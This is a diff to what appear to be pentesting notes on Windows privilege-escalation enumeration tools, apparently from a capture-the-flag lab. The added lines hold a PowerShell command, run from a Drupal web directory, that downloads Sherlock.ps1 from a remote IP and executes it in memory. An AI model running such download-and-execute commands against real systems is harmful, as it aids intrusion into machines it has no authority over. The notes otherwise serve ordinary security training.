@@ -20,7 +20,9 @@ PS C:\temp> .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
 WinPrivCheck by ihack4falafel
 
 Sherlock – New one is Watson
-
+```
+PS C:\inetpub\drupal-7.54> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.124:8000/Sherlock.ps1') ; Find-AllVulns
+```
 PentestMonkey Windows-privesc-check is standalone executable that runs on Windows systems. It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases).
 
 Exploit Suggester For this one, we need to grab the output of systeminfo and then run it against the script. -- Update the database: ./windows-exploit-suggester.py --update
